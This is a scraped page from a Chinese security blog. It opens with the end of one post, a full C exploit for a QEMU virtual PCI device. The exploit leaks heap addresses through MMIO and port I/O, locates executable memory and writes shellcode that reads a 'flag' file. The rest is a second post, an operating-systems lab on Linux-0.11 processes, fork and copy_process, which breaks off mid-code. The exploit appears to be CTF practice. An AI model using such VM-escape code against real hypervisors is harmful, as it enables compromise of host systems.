<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">void</span> * mmio;</span><br><span class="line"><span class="keyword">int</span> port_base = <span class="number">0xc040</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">int</span> addr, <span class="keyword">char</span> val)</span></span>&#123; outb(val, port_base + addr); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">int64_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span>&#123; *(<span class="keyword">uint32_t</span> *)(mmio + addr) = value;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">pmio_read</span><span class="params">(<span class="keyword">int</span> addr)</span> </span>&#123; <span class="keyword">return</span> inl(port_base + addr); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span>&#123; <span class="keyword">return</span> *(<span class="keyword">int</span> *)(mmio + addr); &#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">int</span>  mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    mmio         = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;yehllow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> data[<span class="number">0x10</span>] = &#123;<span class="number">1179927361</span>, <span class="number">860382075</span>, <span class="number">828328803</span>, <span class="number">1232559982</span>, <span class="number">1113548855</span>, <span class="number">1601790528</span>, <span class="number">1752183107</span>, <span class="number">1415541299</span>, <span class="number">1601447013</span>, <span class="number">1365208625</span>, <span class="number">1599425843</span>, <span class="number">2033478768</span>, <span class="number">1968124775</span>, <span class="number">828335182</span>, <span class="number">1095065380</span>, <span class="number">2099345747</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        mmio_write(i*<span class="number">4</span>,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">1</span>,<span class="number">4</span>); </span><br><span class="line">    <span class="keyword">uint32_t</span> addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> heap_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> heap_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> libc_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> libc_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> target_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> shellcode_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        addr = inb(port_base + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(addr == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pmio_write(<span class="number">0x18</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc ok&quot;</span>);</span><br><span class="line">    addr = mmio_read(<span class="number">0x40</span>);</span><br><span class="line">    heap_addr = addr;</span><br><span class="line">    heap_base = heap_addr &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    target_addr = heap_base + <span class="number">0xFF1D000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap_base &gt;&gt; 0x%x\n&quot;</span>,heap_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target_addr &gt;&gt; 0x%x\n&quot;</span>,target_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> dump = <span class="number">0</span>;</span><br><span class="line">        mmio_write(<span class="number">0x40</span>, target_addr);</span><br><span class="line">        dump += pmio_read(<span class="number">0x10</span>);</span><br><span class="line">        mmio_write(<span class="number">0x40</span>, target_addr + <span class="number">4</span>);</span><br><span class="line">        dump += pmio_read(<span class="number">0x10</span>) * <span class="number">0x100000000</span>;</span><br><span class="line"></span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;%d: *(0x%x)=0x%lx \n&quot;</span>, i,target_addr,dump);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dump == <span class="number">0x5641554154415355</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            shellcode_addr = target_addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;shellcode_addr &gt;&gt; 0x%x\n&quot;</span>, shellcode_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        target_addr -= <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> shellcode[] = &#123;<span class="number">0x68</span>,<span class="number">0x66</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x67</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe7</span>,<span class="number">0x31</span>,<span class="number">0xd2</span>,<span class="number">0x31</span>,<span class="number">0xf6</span>,<span class="number">0x6a</span>,<span class="number">0x2</span>,<span class="number">0x58</span>,<span class="number">0xf</span>,<span class="number">0x5</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xc7</span>,<span class="number">0x31</span>,<span class="number">0xc0</span>,<span class="number">0x6a</span>,<span class="number">0x3c</span>,<span class="number">0x5a</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0xf</span>,<span class="number">0x5</span>,<span class="number">0x6a</span>,<span class="number">0x1</span>,<span class="number">0x5f</span>,<span class="number">0x6a</span>,<span class="number">0x3c</span>,<span class="number">0x5a</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x6a</span>,<span class="number">0x1</span>,<span class="number">0x58</span>,<span class="number">0xf</span>,<span class="number">0x5</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode len &gt;&gt; 0x%lx\n&quot;</span>, <span class="built_in">strlen</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    shellcode_addr = shellcode_addr + <span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(shellcode);i++)&#123;</span><br><span class="line">        mmio_write(<span class="number">0x40</span>, shellcode_addr+i);</span><br><span class="line">        pmio_write(<span class="number">0x10</span>,shellcode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_write(<span class="number">0x40</span>, shellcode_addr - <span class="number">4</span>);</span><br><span class="line">    outl(<span class="number">0x90909090</span>, port_base + <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/26/HIT-OSLab3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/26/HIT-OSLab3/" class="post-title-link" itemprop="url">HIT-OSLab3</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-26 22:45:09" itemprop="dateCreated datePublished" datetime="2023-10-26T22:45:09+08:00">2023-10-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-10-27 16:51:49" itemprop="dateModified" datetime="2023-10-27T16:51:49+08:00">2023-10-27</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>HIT-OSLab3</strong></p>
<p>实验目标：</p>
<ul>
<li>掌握 <code>Linux</code> 下的多进程编程技术</li>
<li>通过对进程运行轨迹的跟踪来形象化进程的概念</li>
<li>在进程运行轨迹跟踪的基础上进行相应的数据统计，从而能对进程调度算法进行实际的量化评价，更进一步加深对调度和调度算法的理解，获得能在实际操作系统上对调度算法进行实验数据对比的直接经验</li>
</ul>
<p>基于模板 <code>process.c</code> 编写多进程的样本程序，实现如下功能：</p>
<ul>
<li>所有子进程都并行运行，每个子进程的实际运行时间一般不超过30秒</li>
<li>父进程向标准输出打印所有子进程的 id，并在所有子进程都退出后才退出</li>
<li>在 Linux-0.11 上实现进程运行轨迹的跟踪，基本任务是在内核中维护一个日志文件 <code>/var/process.log</code>，把从操作系统启动到系统关机过程中所有进程的运行轨迹都记录在这一 log 文件中</li>
<li>在修改过的 Linux-0.11 上运行样本程序，通过分析 log 文件，统计该程序建立的所有进程的等待时间、完成时间（周转时间）和运行时间，然后计算平均等待时间，平均完成时间和吞吐量</li>
<li>可以自己编写统计程序，也可以使用 python 脚本程序 <code>stat_log.py</code>（在 <code>/home/teacher/</code> 目录下）进行统计</li>
<li>修改 Linux-0.11 进程调度的时间片，然后再运行同样的样本程序，统计同样的时间数据，和原有的情况对比，体会不同时间片带来的差异</li>
</ul>
<p><strong>实验过程</strong></p>
<p>文件 <code>./files/process.c</code> 的信息如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/times.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HZ	100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpuio_bound</span><span class="params">(<span class="keyword">int</span> last, <span class="keyword">int</span> cpu_time, <span class="keyword">int</span> io_time)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 此函数按照参数占用CPU和I/O时间</span></span><br><span class="line"><span class="comment"> * last: 函数实际占用CPU和I/O的总时间,不含在就绪队列中的时间, &gt;=0是必须的</span></span><br><span class="line"><span class="comment"> * cpu_time: 一次连续占用CPU的时间, &gt;=0是必须的</span></span><br><span class="line"><span class="comment"> * io_time: 一次I/O消耗的时间, &gt;=0是必须的</span></span><br><span class="line"><span class="comment"> * 如果last &gt; cpu_time + io_time, 则往复多次占用CPU和I/O</span></span><br><span class="line"><span class="comment"> * 所有时间的单位为秒</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpuio_bound</span><span class="params">(<span class="keyword">int</span> last, <span class="keyword">int</span> cpu_time, <span class="keyword">int</span> io_time)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tms</span> <span class="title">start_time</span>, <span class="title">current_time</span>;</span></span><br><span class="line">	<span class="keyword">clock_t</span> utime, stime;</span><br><span class="line">	<span class="keyword">int</span> sleep_time;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (last &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* CPU Burst */</span></span><br><span class="line">		times(&amp;start_time);</span><br><span class="line">		<span class="comment">/* 其实只有t.tms_utime才是真正的CPU时间,但我们是在模拟一个只在用户状态运行的CPU大户,就像&quot;for(;;);&quot;,所以把t.tms_stime加上很合理 */</span></span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			times(&amp;current_time);</span><br><span class="line">			utime = current_time.tms_utime - start_time.tms_utime;</span><br><span class="line">			stime = current_time.tms_stime - start_time.tms_stime;</span><br><span class="line">		&#125; <span class="keyword">while</span> ( ( (utime + stime) / HZ )  &lt; cpu_time );</span><br><span class="line">		last -= cpu_time;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (last &lt;= <span class="number">0</span> )</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* IO Burst */</span></span><br><span class="line">		<span class="comment">/* 用sleep(1)模拟1秒钟的I/O操作 */</span></span><br><span class="line">		sleep_time=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (sleep_time &lt; io_time)</span><br><span class="line">		&#123;</span><br><span class="line">			sleep(<span class="number">1</span>);</span><br><span class="line">			sleep_time++;</span><br><span class="line">		&#125;</span><br><span class="line">		last -= sleep_time;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个文件主要实现了 <code>cpuio_bound</code> 函数</li>
<li>程序会先用 <code>times</code> 系统调用来获取系统的时间信息，源码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tms</span> &#123;</span></span><br><span class="line">	<span class="keyword">time_t</span> tms_utime;	<span class="comment">/* 表示当前进程的用户时间,即进程执行用户空间代码的时间 */</span></span><br><span class="line">	<span class="keyword">time_t</span> tms_stime;	<span class="comment">/* 表示当前进程的内核时间,即进程执行内核代码的时间 */</span></span><br><span class="line">	<span class="keyword">time_t</span> tms_cutime;	<span class="comment">/* 表示当前进程的父进程的用户时间 */</span></span><br><span class="line">	<span class="keyword">time_t</span> tms_cstime;	<span class="comment">/* 表示当前进程的父进程的内核时间 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_times</span><span class="params">(struct tms * tbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (tbuf) &#123;</span><br><span class="line">		verify_area(tbuf,<span class="keyword">sizeof</span> *tbuf);</span><br><span class="line">        <span class="comment">/* current是内核中的tms结构体,内核会自动更新current全局变量的值,以反映当前进程的执行时间信息 */</span></span><br><span class="line">		put_fs_long(current-&gt;utime,(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;tbuf-&gt;tms_utime);</span><br><span class="line">		put_fs_long(current-&gt;stime,(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;tbuf-&gt;tms_stime);</span><br><span class="line">		put_fs_long(current-&gt;cutime,(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;tbuf-&gt;tms_cutime);</span><br><span class="line">		put_fs_long(current-&gt;cstime,(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;tbuf-&gt;tms_cstime);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> jiffies;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>接着程序会分别模拟占用一次 CPU 资源和等待1秒 IO 资源这两个操作</li>
</ul>
<p>实验的第一个要求是进程并发，此时我们需要 fork 系统调用，该系统调用会将父进程拷贝一份作为子进程</p>
<p>在 linux-0.11 中 sys_fork 的实现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.align 2</span><br><span class="line">sys_fork:</span><br><span class="line">	call find_empty_process		# 查找是否存在一个空闲的进程ID</span><br><span class="line">	testl %eax,%eax</span><br><span class="line">	js 1f</span><br><span class="line">	push %gs				# gs:主要用于保存全局符号表的基址</span><br><span class="line">	pushl %esi</span><br><span class="line">	pushl %edi</span><br><span class="line">	pushl %ebp</span><br><span class="line">	pushl %eax</span><br><span class="line">	call copy_process		# 复制指定进程的内存空间</span><br><span class="line">	addl $20,%esp</span><br><span class="line">1:	ret</span><br></pre></td></tr></table></figure>
<ul>
<li>核心函数 copy_process 的实现如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NR_TASKS 64</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">task</span>[<span class="title">NR_TASKS</span>] =</span> &#123;&amp;(init_task.task), &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_process</span><span class="params">(<span class="keyword">int</span> nr,<span class="keyword">long</span> ebp,<span class="keyword">long</span> edi,<span class="keyword">long</span> esi,<span class="keyword">long</span> gs,<span class="keyword">long</span> none,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">long</span> ebx,<span class="keyword">long</span> ecx,<span class="keyword">long</span> edx,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">long</span> fs,<span class="keyword">long</span> es,<span class="keyword">long</span> ds,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">long</span> eip,<span class="keyword">long</span> cs,<span class="keyword">long</span> eflags,<span class="keyword">long</span> esp,<span class="keyword">long</span> ss)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line"></span><br><span class="line">	p = (struct task_struct *) get_free_page(); <span class="comment">/* 分配task_struct结构体 */</span></span><br><span class="line">	<span class="keyword">if</span> (!p)</span><br><span class="line">		<span class="keyword">return</span> -EAGAIN;</span><br><span class="line">	task[nr] = p;</span><br><span class="line">	*p = *current;	<span class="comment">/* NOTE! this doesn&#x27;t copy the supervisor stack */</span></span><br><span class="line">	p-&gt;state = TASK_UNINTERRUPTIBLE; <span class="comment">/* 设置不可打断的等待状态(由于该进程没有初始化完毕,因此不能被调度) */</span></span><br><span class="line">	p-&gt;pid = last_pid;</span><br><span class="line">	p-&gt;father = current-&gt;pid;</span><br><span class="line">	p-&gt;counter = p-&gt;priority; <span class="comment">/* 设置该进程调用的优先级 */</span></span><br><span class="line">	p-&gt;signal = <span class="number">0</span>;</span><br><span class="line">	p-&gt;alarm = <span class="number">0</span>;</span><br><span class="line">	p-&gt;leader = <span class="number">0</span>;		<span class="comment">/* process leadership doesn&#x27;t inherit */</span></span><br><span class="line">	p-&gt;utime = p-&gt;stime = <span class="number">0</span>;</span><br><span class="line">	p-&gt;cutime = p-&gt;cstime = <span class="number">0</span>;</span><br><span class="line">	p-&gt;start_time = jiffies;</span><br><span class="line">	p-&gt;tss.back_link = <span class="number">0</span>;</span><br><span class="line">	p-&gt;tss.esp0 = PAGE_SIZE + (<span class="keyword">long</span>) p;</span><br><span class="line">	p-&gt;tss.ss0 = <span class="number">0x10</span>;</span><br><span class="line">	p-&gt;tss.eip = eip;</span><br><span class="line">	p-&gt;tss.eflags = eflags;</span><br><span class="line">	p-&gt;tss.eax = <span class="number">0</span>;</span><br><span class="line">	p-&gt;tss.ecx = ecx;</span><br><span class="line">	p-&gt;tss.edx = edx;</span><br><span class="line">	p-&gt;tss.ebx = ebx;</span><br><span class="line">	p-&gt;tss.esp = esp;</span><br><span class="line">	p-&gt;tss.ebp = ebp;</span><br><span class="line">	p-&gt;tss.esi = esi;</span><br><span class="line">	p-&gt;tss.edi = edi;</span><br><span class="line">	p-&gt;tss.es = es &amp; <span class="number">0xffff</span>;</span><br><span class="line">	p-&gt;tss.cs = cs &amp; <span class="number">0xffff</span>;</span><br><span class="line">	p-&gt;tss.ss = ss &amp; <span class="number">0xffff</span>;</span><br><span class="line">	p-&gt;tss.ds = ds &amp; <span class="number">0xffff</span>;</span><br><span class="line">	p-&gt;tss.fs = fs &amp; <span class="number">0xffff</span>;</span><br><span class="line">	p-&gt;tss.gs = gs &amp; <span class="number">0xffff</span>;</span><br><span class="line">	p-&gt;tss.ldt = _LDT(nr);</span><br><span class="line">	p-&gt;tss.trace_bitmap = <span class="number">0x80000000</span>;</span><br><span class="line">	<span class="keyword">if</span> (last_task_used_math == current)</span><br><span class="line">		__asm__(<span class="string">&quot;clts ; fnsave %0&quot;</span>::<span class="string">&quot;m&quot;</span> (p-&gt;tss.i387));</span><br><span class="line">	<span class="keyword">if</span> (copy_mem(nr,p)) &#123; <span class="comment">/* 将一个进程的内存空间复制到另一个进程中 */</span></span><br><span class="line">		task[nr] = <span class="literal">NULL</span>;</span><br><span class="line">		free_page((<span class="keyword">long</span>) p);</span><br><span class="line">		<span class="keyword">return</span> -EAGAIN;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;NR_OPEN;i++) <span class="comment">/* 这段代码的作用是遍历一个进程的文件指针数组,并将每个文件指针的计数器加一 */</span></span><br><span class="line">		<span class="keyword">if</span> ((f=p-&gt;filp[i]))</span><br><span class="line">			f-&gt;f_count++;</span><br><span class="line">	<span class="keyword">if</span> (current-&gt;pwd)</span><br><span class="line">		current-&gt;pwd-&gt;i_count++;</span><br><span class="line">	<span class="keyword">if</span> (current-&gt;root)</span><br><span class="line">		current-&gt;root-&gt;i_count++;</span><br><span class="line">	<span class="keyword">if</span> (current-&gt;executable)</span><br><span class="line">		current-&gt;executable-&gt;i_count++;</span><br><span class="line">	set_tss_desc(gdt+(nr&lt;&lt;<span 